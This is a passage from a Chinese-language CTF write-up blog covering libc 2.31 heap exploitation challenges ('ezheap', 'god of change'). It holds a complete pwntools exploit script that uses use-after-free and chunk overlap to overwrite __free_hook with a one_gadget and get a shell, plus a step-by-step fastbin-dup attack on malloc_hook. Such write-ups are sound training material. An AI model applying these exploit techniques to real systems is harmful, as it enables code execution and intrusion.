punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You can modify your suggestions\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input new suggestion\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token operator\">>></span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>原本想过去修改_rtld_global 中的 exit_hook，但是后面发现够不着，而且明明可以直接改 exit 的。</p>\n</blockquote>\n<h2 id=\"ezheap\"><a class=\"markdownIt-Anchor\" href=\"#ezheap\">#</a> ezheap</h2>\n<p>堆 heap, chunk_extend_and_overlapping, use_after_free, free_hook, one_gadget</p>\n<p>libc: 2.31</p>\n<h3 id=\"程序分析\"><a class=\"markdownIt-Anchor\" href=\"#程序分析\">#</a> 程序分析</h3>\n<p>程序中功能选择有创建 <code>add()</code> ，释放 <code>delete()</code> ，显示 <code>show()</code> ，编辑 <code>edit()</code> 。</p>\n<h4 id=\"add函数\"><a class=\"markdownIt-Anchor\" href=\"#add函数\">#</a> add 函数</h4>\n<p>总共可以分配 15 个 chunk，不能覆盖已有 chunk 的地址，且由于释放 chunk 时不清空指针，所以共可以分配 15 次 chunk。</p>\n<p>每次分配中，先分配固定的 0x20 的空间（实际占用 0x30），这里称为 head chunk，其地址放在 notebook 数组中。然后再分配一个对应输入大小的块，称为 real chunk，其大小会储存在 notesize 数组。headchunk 会储存 real chunk 的大小，以及储存 real chunk 的地址 (headchunk+0x18)。</p>\n<h4 id=\"delete函数\"><a class=\"markdownIt-Anchor\" href=\"#delete函数\">#</a> delete 函数</h4>\n<p>这个 delete 函数是个有缺陷的函数。它只会 free 掉对应的 head chunk，而 real chunk 完全不 free 的。也就是只会 free 掉储存在 notebook 数组的地址对应的 chunk。</p>\n<h4 id=\"show函数\"><a class=\"markdownIt-Anchor\" href=\"#show函数\">#</a> show 函数</h4>\n<p>输出 real chunk 的值，也就是先读取 notebook 对应的 head chunk，然后输出 head chunk 中的第 24 个字节开始的地址对应的内容。</p>\n<h4 id=\"edit函数\"><a class=\"markdownIt-Anchor\" href=\"#edit函数\">#</a> edit 函数</h4>\n<p>编辑函数，但是存在检查。</p>\n<p>会检查 head chunk 的储存的 size 与 notesize 储存的是否一致。如果一致，可直接向 head chunk 储存的地址写入内容。</p>\n<h3 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<h4 id=\"任意地址读写\"><a class=\"markdownIt-Anchor\" href=\"#任意地址读写\">#</a> 任意地址读写</h4>\n<p>经典的带有 head chunk 的题。释放两个 headchunk，这时如果请求一个与 headchunk 大小一致的 realchunk，那么 realchunk 会分配到其中一个已经释放的 headchunk 处。这样我们就有办法 free 掉 real chunk 了。</p>\n<p>后续按在堆中出现顺序称呼 headchunk 和 realchunk，如 head0, head1, real0, real1</p>\n<p><img data-src=\"./1.png\" alt=\"1\"></p>\n<p>其次，这样操作后，head0 指向 head2，因此便可以利用 ehad0 修改 head1 的值，保留 size 值不变，修改地址为目标地址，这样就可以利用 head1 配合 edit 函数实现任意地址读写。可以修改如 <code>__free_hook</code>  的值，将其修改为 one_gadget 然后执行 free (0) 实现 getshell。</p>\n<p>这时 head1 还残留着指向 real1 的值，只要将前 0x18 个字节填充了，即可将其泄露。</p>\n<h4 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h4>\n<p>要实现这个目的需要泄露 libc 地址，然后才能计算 <code>__free_hook</code>  和 one_gadget 的地址。而泄露 libc 的方法则是 free 掉一个较大的 chunk，该 chunk 会被放入 unsorted bin，其 fd 和 bk 即为 mainarena+96 的值，可以利用其计算 libc 的基址。利用 UAF 读取该地址。tcache 的大小最大为 0x410，因此释放的 chunk 需要大于该值。</p>\n<p>由于能 free 掉的只有 headchunk，即使创建了一个大 chunk 也 free 不掉。因此可以利用任意地址读写，修改某个 headchunk 的头，使其变为一个大 chunk。大小记得与其他 chunk 对齐。然后释放对应 headchunk，再将其 fd 打印，也就是 mainarena+96 的地址。</p>\n<h3 id=\"步骤-2\"><a class=\"markdownIt-Anchor\" href=\"#步骤-2\">#</a> 步骤</h3>\n<p>先分配 4 次块，第三次分配块的大小为 <code>0x420-0x28-0x10</code> ，目的是让修改后的 0x420 大小的 head2 对齐 head3。然后 free 掉前两个 headchunk，构造任意地址读写。这时填充 head1 泄露堆地址。然后去计算 h2 的真实地址。</p>\n<p>这里懒得一个个构造 head1 了，所以写了个 python 类。传入要修改的地址，通过 head0 写入 head1，然后通过 head1 往目标地址读写。第一次操作修改 head2 的头为 0x421，然后释放 head2 泄露 libc 地址。第二次操作修改 free_hook 为 one_gadget。最后执行一次 free 函数 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29440</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *$rebase(0x1837)')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'write the note: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x420</span><span class=\"token operator\">-</span><span class=\"token number\">0x28</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#free(1)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x17</span><span class=\"token operator\">+</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ab'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>r1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>h0 <span class=\"token operator\">=</span> r1 <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the first chunk is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>h0<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>h2 <span class=\"token operator\">=</span> h0 <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>hc1 <span class=\"token operator\">=</span> headchunk<span class=\"token punctuation\">(</span>h2<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#change h2's size</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x421</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>hc1<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> h2</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mainarena_96 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mainarena_96 <span class=\"token operator\">-</span> <span class=\"token number\">0x1ecbe0</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the libcbase is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>libcbase<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#if offine, libcbase need add 0x30</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">#onegadget = libcbase + 0xe3b01 + 0x30</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>freehook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>   </pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the freehook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>freehook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the one_gadget is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>onegadget<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>hc1<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> freehook</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"god-of-change\"><a class=\"markdownIt-Anchor\" href=\"#god-of-change\">#</a> god of change</h2>\n<p>堆 heap,  tcache dup, off-by-one, malloc_hook, one_gadget</p>\n<p>libc: 2.31</p>\n<h3 id=\"程序分析-2\"><a class=\"markdownIt-Anchor\" href=\"#程序分析-2\">#</a> 程序分析</h3>\n<p>程序中功能选择有创建 <code>add()</code> ，释放 <code>delete()</code> ，显示 <code>show()</code> 。(好像是我自己给程序重命名的)</p>\n<h4 id=\"创建函数\"><a class=\"markdownIt-Anchor\" href=\"#创建函数\">#</a> 创建函数</h4>\n<p>存在很明显的故意的单字节溢出，完全就是怕你看不见。<img data-src=\"./image-20231019210519069.png\" alt=\"image-20231019210519069\"></p>\n<p>其次，限制了 malloc 块的大小，最大为 0x7f。最后，加了两个数组，分别储存分配 chunk 的大小和是否在使用，我分别命名为 chunkSize 和 chunkInuse。</p>\n<p>最多分配 31 次 chunk。</p>\n<h4 id=\"释放函数\"><a class=\"markdownIt-Anchor\" href=\"#释放函数\">#</a> 释放函数</h4>\n<p>不检查 chunkInuse，不清除对应 chunkLIst 的指针，可以 double free。</p>\n<p>会将对应的 chunkSize 和 chunkInuse 置 0。</p>\n<h4 id=\"显示函数\"><a class=\"markdownIt-Anchor\" href=\"#显示函数\">#</a> 显示函数</h4>\n<p>会检查 chunkInuse。</p>\n<h3 id=\"漏洞利用-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用-2\">#</a> 漏洞利用</h3>\n<p>依旧是构造 unsorted bin 泄露 libc 地址。利用 off-by-one 修改相邻的 chunk 的 size，造成 overlapping。然后伪造大 chunk，释放并泄露地址。</p>\n<p>可以利用 tcache dup 进行任意地址读写。高版本对 tcache 的 double free 的检查很严用不了，所以释放 7 个同大小 chunk 填满 tcache，使之后的 chunk 被放入 fastbin，再利用 fastbin 的 double free。这需要目标地址附近能构造 fake chunk。</p>\n<p>由于 free_hook 附近比我的脑子还空，所以只能利用 malloc_hook，然后覆写为 one_gadget。</p>\n<p><img data-src=\"./image-20231019213451394.png\" alt=\"image-20231019213451394\"></p>\n<h3 id=\"步骤-3\"><a class=\"markdownIt-Anchor\" href=\"#步骤-3\">#</a> 步骤</h3>\n<p>分配一堆 chunk，其中 chunk3-12 用于对齐之后伪造的 unsorted chunk，最后分配个 chunk13，防止 unsort chunk 与 top chunk 合并。</p>\n<h4 id=\"泄露libc地址-2\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址-2\">#</a> 泄露 libc 地址</h4>\n<p>释放 chunk0 后再分配，同时覆写 chunk1 的大小为 0x81。释放 chunk1，再输入大小 0x78 分配到 chunk1，覆写 chunk2 对应的 size 为 0x461。</p>\n<p>释放 chunk2，使其进入 unsorted bin。再次释放并分配 chunk1，填充 <code>'a'</code>  到 chunk2 的内容区。打印 chunk1 得到 mainarena+96 的地址。用 chunkList [16] 读取 chunk1，因为 chunkList [1] 等的 chunkInuse 已被置 0 无法调用显示函数。</p>\n<h4 id=\"构造fake-chunk\"><a class=\"markdownIt-Anchor\" href=\"#构造fake-chunk\">#</a> 构造 fake chunk</h4>\n<p>在 malloc_hook 附近寻找适合的数据。找到个 0x7f 适合构建 fake chunk。</p>\n<p><img data-src=\"./image-20231019214339224.png\" alt=\"image-20231019214339224\"></p>\n<p>黄色为 prev_size，蓝色为 size，红色为需要覆写的地方。因此 fakechunk 的真实地址为 <code>mallochook-0x30-3</code> ，而其填充内容 <code>payload=b'\\0'*(0x20+3) + p64(one_gadget)</code> 。</p>\n<p><img data-src=\"./image-20231019215016659.png\" alt=\"image-20231019215016659\"> 该 fake chunk 释放时会进入 0x70 的 fastbin，所以之前分配了大量 0x70 真实大小的 chunk。释放 7 个 0x70 真实大小的 chunk。之后再释放一个同大小 chunk，并将其 fd 修改为 fake chunk 的地址。这里选择再利用 chunk1 和 chunk2 构造。修改 chunk2 的 size 为 0x71，释放 chunk1 后，再次利用 chunk1 修改其 fd。</p>\n<p>最后分配掉 tcache 里所有 chunk，程序会将 fastbin 内的 chunk 转化为 tcahce 里的 chunk，再次分配，直到分配到 fake chunk 并修改 malloc_hook 的值。</p>\n<h4 id=\"调用one_gadget\"><a class=\"markdownIt-Anchor\" href=\"#调用one_gadget\">#</a> 调用 one_gadget</h4>\n<p>malloc 非 0 值的时候是找不到合适的 one_gadget 的。但是观察到 rdi 的值与 malloc 时输入的 size 值是一致的，于是我尝试了一下 malloc (0)。</p>\n<blockquote>\n<p>在尝试 malloc (0) 这之前我打算修改 free_hook，然后 free 含有 <code>&quot;/bin/sh\\0&quot;</code>  的 chunk。因此试过 unsorted bin attack，unlink。这些都失败了，因为高版本对 unlink 的检查很严格。还打算尝试多次 tcache dup 修改 main_arena 中的 top chunk 的地址，使其指向 free_hook 附近，但是分配的 chunk 就会超过 30 次。最后想尝试 malloc_hook 指向 reaclloc，然后修改 realloc_hook 指向 one_gadget。在调整 malloc_hook 指向的起始位置的时候才发现了 rdi 的值的特点。</p>\n</blockquote>\n<p><img 